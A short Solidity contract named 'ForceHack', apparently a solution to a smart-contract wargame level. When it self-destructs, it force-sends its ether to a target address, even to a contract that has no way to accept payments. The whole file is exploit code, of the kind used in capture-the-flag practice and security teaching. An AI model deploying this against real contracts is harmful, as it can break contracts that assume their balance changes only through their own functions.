// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {
    address public force;

    constructor(address _force) payable {
        force = _force;
    }

    function attack() external {
        address payable force = payable(force);
        selfdestruct(force);
    }
}
